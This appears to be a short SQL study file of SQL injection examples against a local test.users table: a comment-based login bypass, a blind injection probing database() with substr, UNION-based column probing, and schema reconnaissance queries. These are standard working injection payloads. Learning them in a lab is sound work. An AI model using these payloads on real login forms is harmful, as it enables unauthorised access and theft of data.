# basic SQL injection
# SELECT * FROM test.users WHERE name = 'admin' #+ admin' AND password = 'verysecret';

# blind SQL injection ?
# SELECT * FROM test.users WHERE name = 'admin' AND substr((select database()),1,1) = 115 #' AND password = 'verysecret';

# UNION SQL Injection
# SELECT * FROM test.users WHERE name = 'admin' ORDER BY 1 # ' AND password = 'verysecret';
# SELECT * FROM test.users WHERE name = 'admin' UNION SELECT null, null # ' AND password = 'verysecret';
# SELECT * FROM test.users WHERE name = 'admin' UNION SELECT 'a', null # ' AND password = 'verysecret';

#SHOW VARIABLES LIKE '@@version';
SELECT database() FROM test.users;

SELECT table_name FROM information_schema.tables;